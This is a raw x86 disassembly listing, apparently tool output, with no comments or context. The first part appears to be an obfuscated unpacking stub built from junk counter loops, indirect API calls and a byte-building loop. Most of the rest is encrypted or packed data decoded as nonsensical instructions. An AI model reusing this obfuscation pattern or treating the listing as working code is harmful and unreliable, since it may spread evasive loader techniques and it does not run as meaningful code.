  419dd7:	xor    ecx,0x8a29a123
  419ddd:	xor    ebx,0x0
  419de0:	mov    DWORD PTR [ebp-0x20],eax
  419de3:	cmp    ecx,edx
  419de5:	jne    0x419d80
  419deb:	cmp    ebx,DWORD PTR [ebp-0x7c]
  419dee:	jne    0x419d80
  419df4:	mov    eax,DWORD PTR [ebp-0x1c]
  419df7:	mov    eax,DWORD PTR [eax]
  419df9:	pop    edi
  419dfa:	pop    esi
  419dfb:	pop    ebx
  419dfc:	leave  
  419dfd:	ret    0xc
  419e00:	push   ebp
  419e01:	mov    ebp,esp
  419e03:	sub    esp,0xa4
  419e09:	mov    DWORD PTR ds:0x42b000,0x1b
  419e13:	cmp    DWORD PTR ds:0x42b000,0x0
  419e1a:	je     0x419e69
  419e20:	cmp    DWORD PTR ds:0x42b000,0x4
  419e27:	jne    0x419e3b
  419e2d:	push   0x428000
  419e32:	push   DWORD PTR [ebp-0xc]
  419e35:	call   DWORD PTR ds:0x424014
  419e3b:	cmp    DWORD PTR ds:0x42b000,0x5
  419e42:	jne    0x419e57
  419e48:	xor    ecx,ecx
  419e4a:	xor    ecx,DWORD PTR ds:0x42b000
  419e50:	dec    ecx
  419e51:	mov    DWORD PTR ds:0x42b000,ecx
  419e57:	mov    ecx,DWORD PTR ds:0x42b000
  419e5d:	dec    ecx
  419e5e:	mov    DWORD PTR ds:0x42b000,ecx
  419e64:	jmp    0x419e13
  419e69:	mov    ecx,DWORD PTR [ebp+0x8]
  419e6c:	add    DWORD PTR ds:0x429004,0x326a
  419e76:	mov    eax,0x8a85
  419e7b:	sbb    DWORD PTR ds:0x42c014,0x42a000
  419e85:	xor    ax,WORD PTR [ecx+0x20]
  419e89:	sbb    ecx,DWORD PTR ds:0x42c008
  419e8f:	mov    ecx,0x3b4b
  419e94:	add    ax,cx
  419e97:	not    ecx
  419e99:	movzx  eax,ax
  419e9c:	mov    DWORD PTR [ebp-0x18],eax
  419e9f:	mov    BYTE PTR [ebp-0x1],0x61
  419ea3:	sub    DWORD PTR ds:0x429018,edi
  419ea9:	lea    eax,[ebp-0x1]
  419eac:	mov    DWORD PTR [ebp-0x10],eax
  419eaf:	mov    al,BYTE PTR [ebp-0x1]
  419eb2:	mov    DWORD PTR ds:0x42b018,0x13
  419ebc:	cmp    DWORD PTR ds:0x42b018,0x0
  419ec3:	je     0x419f16
  419ec9:	cmp    DWORD PTR ds:0x42b018,0x1f
  419ed0:	jne    0x419efe
  419ed6:	push   0x7696
  419edb:	push   0x42c01c
  419ee0:	push   0x4031
  419ee5:	push   0x429010
  419eea:	push   0x1f96
  419eef:	push   DWORD PTR [ebp-0x18]
  419ef2:	push   DWORD PTR [ebp-0x20]
  419ef5:	push   DWORD PTR [ebp-0x1c]
  419ef8:	call   DWORD PTR ds:0x424018
  419efe:	mov    ecx,DWORD PTR ds:0x42b018
  419f04:	dec    ecx
  419f05:	mov    DWORD PTR ds:0x42b018,ecx
  419f0b:	jmp    0x419ebc
  419f10:	sub    DWORD PTR ds:0x428008,ecx
  419f16:	mov    ecx,DWORD PTR [ebp-0x10]
  419f19:	xor    al,0x6f
  419f1b:	adc    DWORD PTR ds:0x429004,0x428004
  419f25:	sub    al,0xd
  419f27:	mov    BYTE PTR [ecx],al
  419f29:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  419f30:	and    DWORD PTR ds:0x428010,0x0
  419f3a:	jmp    0x419f4c
  419f3f:	mov    ecx,DWORD PTR ds:0x428010
  419f45:	inc    ecx
  419f46:	mov    DWORD PTR ds:0x428010,ecx
  419f4c:	cmp    DWORD PTR ds:0x428010,0x12
  419f53:	jae    0x419f77
  419f59:	cmp    DWORD PTR ds:0x428010,0x22
  419f60:	jne    0x419f71
  419f66:	push   0x80ee
  419f6b:	call   DWORD PTR ds:0x42401c
  419f71:	jmp    0x419f3f
  419f76:	inc    eax
  419f77:	push   ebx
  419f78:	and    DWORD PTR ds:0x428020,0x0
  419f82:	mov    eax,ds:0x428020
  419f87:	inc    eax
  419f88:	mov    ds:0x428020,eax
  419f8d:	cmp    DWORD PTR ds:0x428020,0x21
  419f94:	jne    0x419fa8
  419f9a:	push   0x12b4
  419f9f:	push   DWORD PTR [ebp-0xc]
  419fa2:	call   DWORD PTR ds:0x424020
  419fa8:	cmp    DWORD PTR ds:0x428020,0x16
  419faf:	jb     0x419f82
  419fb5:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  419fbc:	sub    eax,0x5057
  419fc1:	mov    ecx,DWORD PTR [ebp-0x14]
  419fc4:	xor    DWORD PTR ds:0x42a010,0x31a
  419fce:	push   esi
  419fcf:	and    DWORD PTR ds:0x42801c,0x42b000
  419fd9:	mov    eax,0x7510893
  419fde:	xor    ecx,eax
  419fe0:	mov    esi,0x3272db
  419fe5:	push   edi
  419fe6:	add    ecx,esi
  419fe8:	jmp    0x41a00c
  419fed:	mov    DWORD PTR ds:0x428010,0x3a90
  419ff7:	mov    dl,BYTE PTR [ebp-0x1]
  419ffa:	mov    DWORD PTR ds:0x42b000,0x1f96
  41a004:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41a00b:	inc    ecx
  41a00c:	mov    DWORD PTR ds:0x42b008,0x156a
  41a016:	cmp    ecx,0x40
  41a019:	mov    DWORD PTR ds:0x42b004,0x31d2
  41a023:	jb     0x419fed
  41a029:	sbb    edx,DWORD PTR ds:0x429018
  41a02f:	mov    edx,DWORD PTR [ebp-0x14]
  41a032:	dec    DWORD PTR ds:0x428028
  41a038:	xor    edx,eax
  41a03a:	add    edx,esi
  41a03c:	mov    DWORD PTR ds:0x42a00c,0x26bd
  41a046:	jmp    0x41c434
  41a04b:	mov    edi,DWORD PTR [ebp+0x8]
  41a04e:	jmp    0x41c3c9
  41a053:	ud1    esp,DWORD PTR [edx+edi*2-0x78941c5c]
  41a05b:	(bad)  
  41a05c:	mov    ch,0x8f
  41a05e:	std    
  41a05f:	scas   al,BYTE PTR es:[edi]
  41a060:	xor    DWORD PTR [ecx-0x50],eax
  41a063:	pop    edi
  41a064:	add    BYTE PTR [ecx+0x62],ah
  41a067:	add    al,0x5f
  41a069:	bound  esp,QWORD PTR [edx-0x3]
  41a06c:	shl    BYTE PTR [esi-0xf],cl
  41a06f:	test   DWORD PTR [esi],ebp
  41a071:	xlat   BYTE PTR ds:[ebx]
  41a072:	push   0xa6e80822
  41a077:	mov    ebp,0x6c7e60fb
  41a07c:	outs   dx,DWORD PTR ds:[esi]
  41a07d:	cli    
  41a07e:	les    eax,FWORD PTR [ebp-0x4ae0e573]
  41a084:	mov    edx,0xc35f5512
  41a08a:	stos   BYTE PTR es:[edi],al
  41a08b:	lock popa 
  41a08d:	test   al,0xb4
  41a08f:	(bad)  
  41a090:	sbb    al,0xc2
  41a092:	sar    BYTE PTR [ecx-0x7992a9a1],1
  41a098:	sbb    al,0x26
  41a09a:	fbld   TBYTE PTR ds:0x843d2aab
  41a0a0:	dec    esp
  41a0a1:	into   
  41a0a2:	int    0x81
  41a0a4:	scas   eax,DWORD PTR es:[edi]
  41a0a5:	packuswb mm7,QWORD PTR ds:0xc6f18499
  41a0ac:	mov    ch,0x6c
  41a0ae:	icebp  
  41a0af:	mov    DWORD PTR [edi],esp
  41a0b1:	jb     0x4df86e42
  41a0b7:	mov    esp,0x8fa5094f
  41a0bc:	pop    edx
  41a0bd:	sbb    esi,DWORD PTR [edi-0x62]
  41a0c0:	add    DWORD PTR [ebx-0x2bab6a47],eax
  41a0c6:	js     0x41a11b
  41a0c8:	out    0x63,eax
  41a0ca:	inc    edx
  41a0cb:	daa    
  41a0cc:	fmul   st,st(3)
  41a0ce:	and    BYTE PTR [ebp+0x2a],0xea
  41a0d2:	pop    ebp
  41a0d3:	adc    ah,BYTE PTR [esi]
  41a0d5:	sub    al,BYTE PTR [ebx]
  41a0d7:	in     al,0x27
  41a0d9:	cs jmp 0x3e4c4261
  41a0df:	mov    dl,0x8f
  41a0e1:	push   edx
  41a0e2:	lds    esi,FWORD PTR [esi]
  41a0e4:	add    bh,bl
  41a0e6:	sub    DWORD PTR ds:0x20490b9d,esi
  41a0ec:	push   edx
  41a0ed:	inc    eax
  41a0ee:	pop    edx
  41a0ef:	xchg   esi,eax
  41a0f0:	out    dx,eax
  41a0f1:	or     eax,0xf683205e
  41a0f6:	mov    ebx,0x5590e9f0
  41a0fb:	popa   
  41a0fc:	(bad)  
  41a0fd:	mov    esi,0x7647061d
  41a102:	mov    ebx,0x54e99556
  41a107:	jge    0x41a10d
  41a109:	loop   0x41a0ea
  41a10b:	xchg   ebp,eax
  41a10c:	mov    eax,ds:0x5da1c0d5
  41a111:	push   esi
  41a112:	pushf  
  41a113:	push   ss
  41a114:	push   es
  41a115:	in     al,0x73
  41a117:	or     bl,ch
  41a119:	pop    ecx
  41a11a:	mov    WORD PTR [esi-0x53fb535c],?
  41a120:	nop
  41a121:	arpl   WORD PTR [ebp+0x6707f7b3],di
  41a127:	cmp    bh,BYTE PTR [ebx-0x45]
  41a12a:	cmp    ebp,edx
  41a12c:	mov    al,ds:0x3e4d80c9
  41a131:	lock inc ebx
  41a133:	out    dx,eax
  41a134:	rol    DWORD PTR [ebp+0x37932278],cl
  41a13a:	imul   ecx,eax,0xebae719d
  41a140:	ret    
  41a141:	rcr    BYTE PTR [esi+0x10],cl
  41a144:	out    dx,al
  41a145:	mov    al,ds:0x36b15d05
  41a14a:	add    BYTE PTR [eax+0x35a8cc4d],bh
  41a150:	dec    ebx
  41a151:	adc    al,0xd9
  41a153:	and    al,0x9a
  41a155:	js     0x41a108
  41a157:	fs iret 
  41a159:	adc    al,0xf4
  41a15b:	fcomp  QWORD PTR [ecx+0x39]
  41a15e:	adc    eax,0xb9c4ac23
  41a163:	push   eax
  41a164:	xor    eax,0x5d4369
  41a169:	add    DWORD PTR [edx+0x22],ecx
  41a16c:	les    ecx,FWORD PTR [edx]
  41a16e:	xor    al,0xa8
  41a170:	xchg   edx,eax
  41a171:	pop    ecx
  41a172:	sub    al,0x50
  41a174:	ins    BYTE PTR es:[edi],dx
  41a175:	leave  
  41a176:	out    dx,eax
  41a177:	xor    ebx,DWORD PTR [edx+0x4f]
  41a17a:	ret    
  41a17b:	adc    eax,0x3b2537fb
  41a180:	dec    ebx
  41a181:	push   esp
  41a182:	lods   al,BYTE PTR ds:[esi]
  41a183:	xchg   ecx,eax
  41a184:	addr16 sbb al,ah
  41a187:	sub    eax,0x4aa7d10e
  41a18c:	mov    ebp,0xce8e798b
  41a191:	push   esi
  41a192:	scas   eax,DWORD PTR es:[edi]
  41a193:	jp     0x41a208
  41a195:	mov    dh,0xf1
  41a197:	inc    eax
  41a198:	inc    edi
  41a199:	xor    BYTE PTR [ebx],bl
  41a19b:	stc    
  41a19c:	outs   dx,BYTE PTR ds:[esi]
  41a19d:	sub    al,0xad
  41a19f:	jmp    0xa2ae:0xc630c836
  41a1a6:	mov    ebp,0x22d85e2c
  41a1ab:	rcl    BYTE PTR [edi-0x73],1
  41a1ae:	int    0x22
  41a1b0:	lea    ecx,[edi-0x39e4c7ef]
  41a1b6:	ja     0x41a171
  41a1b8:	mov    cx,0xcf68
  41a1bc:	popf   
  41a1bd:	inc    ebx
  41a1be:	pop    esp
  41a1bf:	adc    ebp,ebp
  41a1c1:	dec    ecx
  41a1c2:	ss jmp 0x41a1d5
  41a1c5:	aaa    
  41a1c6:	je     0x41a1f4
  41a1c8:	sbb    DWORD PTR [esi-0x14044054],edi
  41a1ce:	aam    0x6b
  41a1d0:	mov    esp,0x91244df5
  41a1d5:	mov    ds:0xc1890222,eax
  41a1da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1db:	ins    DWORD PTR es:[edi],dx
  41a1dc:	(bad)  
  41a1dd:	js     0x41a210
  41a1df:	call   0x9c19:0xb7fddfb2
  41a1e6:	repnz pop esi
  41a1e8:	xchg   BYTE PTR [ebp-0x32690b1],ch
  41a1ee:	dec    esp
  41a1ef:	mov    eax,0xb2e26dab
  41a1f4:	xchg   ebx,eax
  41a1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1f6:	sbb    esi,DWORD PTR [eax]
  41a1f8:	xor    eax,DWORD PTR [ecx]
  41a1fa:	sub    esp,esi
  41a1fc:	add    DWORD PTR [ebx+0x1e87a1c6],ebp
  41a202:	and    al,0x8b
  41a204:	sar    esp,0xfb
  41a207:	mov    dh,0x7e
  41a209:	sub    al,0xa7
  41a20b:	and    DWORD PTR [ecx-0x3ed073ff],esp
  41a211:	push   ss
  41a212:	adc    DWORD PTR [ebx],ebx
  41a214:	scas   eax,DWORD PTR es:[edi]
  41a215:	adc    eax,0xab6fed59
  41a21a:	or     ah,ah
  41a21c:	pop    ebp
  41a21d:	jmp    0x87dd:0x625fefbe
  41a224:	jns    0x41a248
  41a226:	scas   eax,DWORD PTR es:[edi]
  41a227:	cs pop ebp
  41a229:	lahf   
  41a22a:	int    0x17
  41a22c:	mov    esp,0x233fded9
  41a231:	jmp    0x5f146bb6
  41a236:	ins    DWORD PTR es:[di],dx
  41a238:	dec    eax
  41a239:	xor    ecx,esi
  41a23b:	stc    
  41a23c:	jnp    0x55c96865
  41a242:	and    DWORD PTR [eax-0x6c],ecx
  41a245:	mov    bl,0x68
  41a247:	sub    edx,DWORD PTR [eax+0x34]
  41a24a:	(bad)  
  41a24b:	lock ja 0x41a205
  41a24e:	lock mov edi,0x44a57c01
  41a254:	(bad)  
  41a256:	call   0x69b3:0xdd345844
  41a25d:	loopne 0x41a266
  41a25f:	cdq    
  41a260:	outs   dx,BYTE PTR ds:[esi]
  41a261:	mov    BYTE PTR [esi-0x1],0xb0
  41a265:	dec    esi
  41a266:	cs inc ecx
  41a268:	inc    ebx
  41a269:	popf   
  41a26a:	iret   
  41a26b:	dec    edi
  41a26c:	in     eax,0x79
  41a26e:	arpl   WORD PTR [ebx+eiz*4],si
  41a271:	and    ah,BYTE PTR [ebx]
  41a273:	xchg   esp,eax
  41a274:	mov    ch,0x4
  41a276:	sbb    BYTE PTR [ecx],al
  41a278:	(bad)  
  41a279:	jmp    0xbd1f59bd
  41a27e:	in     al,0x18
  41a280:	adc    ecx,DWORD PTR [edx]
  41a282:	(bad)  
  41a283:	sub    DWORD PTR [eax],ebp
  41a285:	sti    
  41a286:	loope  0x41a2bc
  41a288:	inc    edi
  41a289:	add    esi,DWORD PTR [eax-0x792d0c78]
  41a28f:	stos   BYTE PTR es:[edi],al
  41a290:	iret   
  41a291:	mov    ah,bh
  41a293:	jnp    0x41a311
  41a295:	add    BYTE PTR [esi-0x575ad818],bh
  41a29b:	or     ebx,DWORD PTR [ecx+0x2a42b242]
  41a2a1:	es popa 
  41a2a3:	cmp    ebx,DWORD PTR [edi]
  41a2a5:	ja     0x41a231
  41a2a7:	mov    dl,0x46
  41a2a9:	jecxz  0x41a2d6
  41a2ab:	jmp    0xfdb8:0x593e39be
  41a2b2:	pop    eax
  41a2b3:	(bad)  
  41a2b4:	cmp    dl,BYTE PTR [ebp+0x9]
  41a2b7:	push   esi
  41a2b8:	dec    esi
  41a2b9:	aaa    
  41a2ba:	mov    ecx,DWORD PTR [ecx+0x776af905]
  41a2c0:	add    eax,0x88d09eb9
  41a2c5:	in     al,dx
  41a2c6:	out    0x8d,al
  41a2c8:	adc    DWORD PTR [esi+0x63],ecx
  41a2cb:	sahf   
  41a2cc:	ret    
  41a2cd:	or     BYTE PTR [edx+0x17],bh
  41a2d0:	in     al,dx
  41a2d1:	sahf   
  41a2d2:	std    
  41a2d3:	scas   al,BYTE PTR es:[edi]
  41a2d4:	inc    esi
  41a2d5:	jmp    DWORD PTR [edx-0x193943cc]
  41a2db:	imul   DWORD PTR [edi]
  41a2dd:	sahf   
  41a2de:	outs   dx,BYTE PTR ds:[esi]
  41a2df:	adc    esi,esp
  41a2e1:	mov    ds:0xbce2f6f1,eax
  41a2e6:	es addr16 in al,dx
  41a2e9:	pop    ss
  41a2ea:	xor    BYTE PTR [ecx-0x34dc5b1d],cl
  41a2f0:	xchg   edi,eax
  41a2f1:	imul   esp,DWORD PTR [edx],0x78
  41a2f4:	mov    ah,0x82
  41a2f6:	retf   
  41a2f7:	dec    ebx
  41a2f8:	fistp  WORD PTR [ebp-0x285dd30]
  41a2fe:	dec    edx
  41a2ff:	fbld   TBYTE PTR [eax]
  41a301:	xchg   edi,eax
  41a302:	xchg   BYTE PTR [ecx+0x9],dh
  41a305:	shl    DWORD PTR [edi],cl
  41a307:	lea    ebx,[ebx+0x280aa3ff]
  41a30d:	sub    al,0xea
  41a30f:	fcomp  QWORD PTR [esi]
  41a311:	mov    ch,0x7d
  41a313:	adc    al,0x9e
  41a315:	sub    eax,DWORD PTR [edi+0x100cb7d3]
  41a31b:	pop    ecx
  41a31c:	sbb    eax,0x148208db
  41a321:	and    dl,bh
  41a323:	mov    edi,0x37ed2cf3
  41a328:	xchg   edi,eax
  41a329:	retf   
  41a32a:	sbb    DWORD PTR [ebx-0x2d],ebp
  41a32d:	scas   eax,DWORD PTR es:[edi]
  41a32e:	ins    DWORD PTR es:[edi],dx
  41a32f:	sbb    al,0x80
  41a331:	sar    BYTE PTR [ebx],cl
  41a333:	aad    0x47
  41a335:	mov    WORD PTR [edx+ecx*2-0x74],cs
  41a339:	or     eax,0x9de4446e
  41a33e:	arpl   WORD PTR [ecx],si
  41a340:	imul   ebx,DWORD PTR [ebx],0x48aee1ee
  41a346:	dec    esi
  41a347:	out    dx,al
  41a348:	mov    edx,0xf2312d4a
  41a34d:	imul   esp,DWORD PTR [edx],0xffffffde
  41a350:	loopne 0x41a2d6
  41a352:	xchg   ebp,eax
  41a353:	in     al,0xed
  41a355:	pop    ds
  41a356:	pop    ds
  41a357:	test   edx,eax
  41a359:	enter  0xa481,0xaf
  41a35d:	add    BYTE PTR [ebx],0x53
  41a360:	enter  0x2194,0xc8
  41a364:	fidivr DWORD PTR [esi]
  41a366:	or     al,cl
  41a368:	fmul   QWORD PTR [edx-0x1d]
  41a36b:	cwde   
  41a36c:	scas   eax,DWORD PTR es:[edi]
  41a36d:	push   ebp
  41a36e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a36f:	inc    edx
  41a370:	lods   al,BYTE PTR ds:[esi]
  41a371:	sbb    BYTE PTR [esi-0x388a7550],dl
  41a377:	call   0xa2a8:0x3975f660
  41a37e:	jmp    0x81fe6ac4
  41a383:	inc    ebp
  41a384:	aad    0x47
  41a386:	jo     0x41a3e8
  41a388:	sub    al,bl
  41a38a:	and    BYTE PTR [ebx-0x45],ch
  41a38d:	fbld   TBYTE PTR [esi]
  41a38f:	jl     0x41a35e
  41a391:	inc    DWORD PTR [edx]
  41a393:	mov    ss,WORD PTR [ecx-0x8]
  41a396:	sub    DWORD PTR [edx],ebp
  41a398:	cmp    esp,esi
  41a39a:	sub    al,0x74
  41a39c:	jmp    0x8e4be21f
  41a3a1:	mov    bl,0x43
  41a3a3:	push   esp
  41a3a4:	(bad)  
  41a3a5:	iret   
  41a3a6:	or     dl,cl
  41a3a8:	jnp    0x41a3a6
  41a3aa:	aam    0x30
  41a3ac:	loop   0x41a42b
  41a3ae:	int    0x25
  41a3b0:	repz mov ch,0x31
  41a3b3:	inc    edx
  41a3b4:	psrld  mm0,QWORD PTR [edx+ebx*8]
  41a3b8:	mov    dh,0x93
  41a3ba:	add    BYTE PTR [esi],0xfe
  41a3bd:	mov    esi,0x732aac91
  41a3c2:	icebp  
  41a3c3:	sub    al,0xc1
  41a3c5:	retf   
  41a3c6:	pop    edx
  41a3c7:	jb     0x41a355
  41a3c9:	(bad)  [ebp-0x37]
  41a3cc:	mov    ds:0x50738613,eax
  41a3d1:	pop    ds
  41a3d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3d3:	xchg   esp,eax
  41a3d4:	adc    ch,ch
  41a3d6:	xor    DWORD PTR [eax],esp
  41a3d8:	and    eax,0x7f6a17d8
  41a3dd:	out    0xa8,eax
  41a3df:	push   ds
  41a3e0:	inc    ebp
  41a3e1:	mov    eax,0xc1136c93
  41a3e6:	inc    eax
  41a3e7:	inc    edx
  41a3e8:	pop    eax
  41a3e9:	outs   dx,BYTE PTR ds:[esi]
  41a3ea:	add    bl,cl
  41a3ec:	test   eax,0xa33e4275
  41a3f1:	pop    esi
  41a3f2:	mov    ah,0x85
  41a3f4:	xlat   BYTE PTR ds:[ebx]
  41a3f5:	outs   dx,BYTE PTR ds:[esi]
  41a3f6:	(bad)
  41a3f9:	adc    al,0xf9
  41a3fb:	in     al,0xef
  41a3fd:	dec    ecx
  41a3fe:	adc    cl,bl
  41a400:	adc    DWORD PTR [eax-0x77e8ff59],ebp
  41a406:	jb     0xfc704e8a
  41a40c:	pop    ss
  41a40d:	xchg   BYTE PTR [ebx+0x4b],bl
  41a410:	push   ebp
  41a411:	push   esp
  41a412:	mov    ebx,0xb2d8dcb5
  41a417:	mov    esp,0xc135906f
  41a41c:	cmp    bl,BYTE PTR [esi+0x70]
  41a41f:	dec    ebp
  41a420:	ss pop edx
  41a422:	pop    es
  41a423:	loop   0x41a449
  41a425:	xchg   edx,eax
  41a426:	ror    bl,1
  41a428:	pusha  
  41a429:	loope  0x41a3ea
  41a42b:	push   eax
  41a42c:	fist   WORD PTR [edx+0x11]
  41a42f:	push   ecx
  41a430:	jno    0x41a3ff
  41a432:	push   ecx
  41a433:	fist   DWORD PTR [ebp-0x68]
  41a436:	in     eax,0xa4
  41a438:	xchg   DWORD PTR [edi-0x31ae0b51],ebp
  41a43e:	cmp    eax,0xc36d73ec
  41a443:	inc    esi
  41a444:	mov    esp,0xf46ec523
  41a449:	fcomp  DWORD PTR [edi-0x32]
  41a44c:	pop    ecx
  41a44d:	loopne 0x41a4be
  41a44f:	in     eax,dx
  41a450:	(bad)  
  41a451:	fisub  DWORD PTR [edi]
  41a453:	xchg   esi,eax
  41a454:	pop    ss
  41a455:	cmp    eax,edi
  41a457:	cdq    
  41a458:	push   esp
  41a459:	jg     0x41a42c
  41a45b:	ds retf 
  41a45d:	jne    0x41a49d
  41a45f:	(bad)  
  41a460:	gs jmp 0x7053:0xc6cdcc52
  41a468:	push   edx
  41a469:	adc    bl,BYTE PTR [ebp-0x2b0e6a74]
  41a46f:	and    al,0x50
  41a471:	out    0xb9,al
  41a473:	scas   eax,DWORD PTR es:[edi]
  41a474:	rol    DWORD PTR [edi+0x2c],1
  41a477:	jmp    0x41a481
  41a479:	dec    esi
  41a47a:	repz push ss
  41a47c:	mov    ss,WORD PTR [edx-0x74413b38]
  41a482:	sbb    ecx,DWORD PTR [ecx+0x5f917bd7]
  41a488:	cmp    eax,0x5a24eab6
  41a48d:	outs   dx,BYTE PTR ds:[esi]
  41a48e:	mov    edx,0x7e631308
  41a493:	pop    ebx
  41a494:	xor    DWORD PTR [eax+0x682737f7],0x6434e7c1
  41a49e:	call   0xc63a6446
  41a4a3:	outs   dx,DWORD PTR ds:[esi]
  41a4a4:	xchg   ebp,eax
  41a4a5:	xchg   ebp,eax
  41a4a6:	out    dx,eax
  41a4a7:	imul   ebx,DWORD PTR [edx],0xffffffff
  41a4aa:	push   ss
  41a4ab:	mov    ds:0x36d66dc1,eax
  41a4b0:	push   ss
  41a4b1:	inc    edi
  41a4b2:	dec    ebp
  41a4b3:	ins    BYTE PTR es:[edi],dx
  41a4b4:	sbb    eax,eax
  41a4b6:	loopne 0x41a446
  41a4b8:	push   0x14
  41a4ba:	bound  ebp,QWORD PTR [ecx-0x2907b714]
  41a4c0:	xchg   esi,eax
  41a4c1:	pushf  
  41a4c2:	and    BYTE PTR [ebx],0x1e
  41a4c5:	clc    
  41a4c6:	push   esi
  41a4c7:	es iret 
  41a4c9:	inc    ebx
  41a4ca:	iret   
  41a4cb:	aad    0x71
  41a4cd:	cmc    
  41a4ce:	ror    DWORD PTR [edx],0xb9
  41a4d1:	inc    edx
  41a4d2:	int3   
  41a4d3:	or     BYTE PTR [edi],0xfe
  41a4d6:	add    DWORD PTR [esi-0x68f3ab62],ebp
  41a4dc:	call   0xdeb4:0xa191c880
  41a4e3:	mov    bh,0x60
  41a4e5:	repz loope 0x41a560
  41a4e8:	xor    BYTE PTR [edx],bh
  41a4ea:	data16 loope 0x41a4b0
  41a4ed:	mov    ecx,0xeab9cc84
  41a4f2:	mov    ds:0xb86bc52b,al
  41a4f7:	jbe    0x41a569
  41a4f9:	xor    eax,0x55281450
  41a4fe:	sahf   
  41a4ff:	retf   0x955d
  41a502:	pop    edi
  41a503:	cwde   
  41a504:	sub    eax,0xecf97544
  41a509:	jbe    0x41a587
  41a50b:	xor    ecx,eax
  41a50d:	iret   
  41a50e:	add    eax,0xf34c8b77
  41a513:	push   ebp
  41a514:	dec    ebx
  41a515:	call   FWORD PTR ds:[edx+0x52]
  41a519:	adc    eax,0xf9833a64
  41a51e:	mov    ds:0x4f4064bb,eax
  41a523:	inc    eax
  41a524:	xlat   BYTE PTR ds:[ebx]
  41a525:	pop    ds
  41a526:	les    edi,FWORD PTR [eax+ecx*4+0x1f63212c]
  41a52d:	std    
  41a52e:	cmp    bh,0xd4
  41a531:	sbb    ebx,esp
  41a533:	imul   esi,DWORD PTR [eax],0xdfcfc62
  41a539:	or     al,0xe2
  41a53b:	or     bh,BYTE PTR [esi]
  41a53d:	repnz mov cl,0xf8
  41a540:	xchg   esi,eax
  41a541:	sub    eax,0x31b8773f
  41a546:	mov    ds:0x5137cf73,eax
  41a54b:	pusha  
  41a54c:	iret   
  41a54d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a54e:	dec    ebp
  41a54f:	cmc    
  41a550:	mov    ebp,0xf95aa263
  41a555:	sbb    al,al
  41a557:	pop    ecx
  41a558:	push   edi
  41a559:	mov    DWORD PTR [eax],esi
  41a55b:	push   ss
  41a55c:	mov    ebx,0xebd418dc
  41a561:	sub    eax,0x4b276993
  41a566:	and    eax,0xd349db85
  41a56b:	mov    ebx,DWORD PTR [ebx-0x6c65d122]
  41a571:	not    DWORD PTR [ebx+0x44]
  41a574:	and    al,0xb9
  41a576:	cdq    
  41a577:	mov    al,0x5b
  41a579:	xor    dh,0x73
  41a57c:	dec    edi
  41a57d:	icebp  
  41a57e:	aaa    
  41a57f:	clc    
  41a580:	mov    ch,0xce
  41a582:	fnstenv [ecx+0x5]
  41a585:	jg     0x41a581
  41a587:	xchg   edi,eax
  41a588:	mov    ch,0x4c
  41a58a:	pop    edx
  41a58b:	loopne 0x41a50e
  41a58d:	ficomp DWORD PTR [eax-0x1f3b1971]
  41a593:	inc    ecx
  41a594:	pop    esi
  41a595:	xchg   edx,eax
  41a596:	jge    0x41a585
  41a598:	or     esi,ebp
  41a59a:	clc    
  41a59b:	mov    edi,0xa7a79e84
  41a5a0:	sahf   
  41a5a1:	fnstenv [ecx-0x588168a]
  41a5a7:	scas   al,BYTE PTR es:[edi]
  41a5a8:	(bad)  [eax+0xf]
  41a5ab:	cmp    DWORD PTR [eax+ecx*4],esp
  41a5ae:	call   0x79fb:0x1578967
  41a5b5:	test   DWORD PTR [edx-0x44],edx
  41a5b8:	ins    BYTE PTR es:[edi],dx
  41a5b9:	shl    BYTE PTR ds:0x60cb6ef,1
  41a5bf:	(bad)  
  41a5c0:	jnp    0x41a5a5
  41a5c2:	add    esi,edi
  41a5c4:	ret    
  41a5c5:	ds dec edx
  41a5c7:	fcomp  QWORD PTR [esi+0x76c41017]
  41a5cd:	push   cs
  41a5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5cf:	ss das 
  41a5d1:	jle    0x41a5e8
  41a5d3:	mov    edi,0x1471baba
  41a5d8:	xchg   DWORD PTR [ebx+0x30],ecx
  41a5db:	push   eax
  41a5dc:	ret    0x151
  41a5df:	cld    
  41a5e0:	std    
  41a5e1:	fidivr WORD PTR [edx+eiz*8+0x23]
  41a5e5:	dec    esp
  41a5e6:	iret   
  41a5e7:	and    DWORD PTR ds:[edx-0x27],0x60
  41a5ec:	inc    ebx
  41a5ed:	sbb    esi,DWORD PTR fs:[ebx+ebx*4]
  41a5f1:	lea    esp,[esp+eax*4-0x32a21702]
  41a5f8:	retf   0xda04
  41a5fb:	daa    
  41a5fc:	loop   0x41a611
  41a5fe:	rcr    DWORD PTR [ebp+0x15],0x43
  41a602:	into   
  41a603:	lea    ebp,[ecx-0x13fc2ebc]
  41a609:	sub    dh,BYTE PTR [ecx-0x5d889fb2]
  41a60f:	xor    DWORD PTR [ebp-0x8],edx
  41a612:	mov    bl,al
  41a614:	and    al,0x67
  41a616:	cmp    BYTE PTR [ecx-0x31],ah
  41a619:	and    cl,al
  41a61b:	pusha  
  41a61c:	clc    
  41a61d:	and    dh,al
  41a61f:	arpl   WORD PTR [eax],dx
  41a621:	jg     0x41a5aa
  41a623:	scas   al,BYTE PTR es:[edi]
  41a624:	pop    ss
  41a625:	lock adc BYTE PTR [ecx+0x27],dl
  41a629:	xchg   edi,eax
  41a62a:	mov    ah,0x1f
  41a62c:	jge    0x41a6ac
  41a62e:	std    
  41a62f:	mov    ecx,0x6b567592
  41a634:	loopne 0x41a664
  41a636:	inc    edi
  41a637:	popa   
  41a638:	and    ecx,DWORD PTR ds:0x9747f410
  41a63e:	(bad)  
  41a63f:	and    eax,0x1e7e4c65
  41a644:	out    0x8f,eax
  41a646:	enter  0xa379,0xa4
  41a64a:	jg     0x41a604
  41a64c:	nop
  41a64d:	inc    esi
  41a64e:	cmp    DWORD PTR [ecx-0x5a50460],eax
  41a654:	or     eax,0x2b02f22a
  41a659:	popa   
  41a65a:	push   esp
  41a65b:	pushf  
  41a65c:	ror    DWORD PTR [ebx],cl
  41a65e:	into   
  41a65f:	(bad)  [edx]
  41a661:	dec    ecx
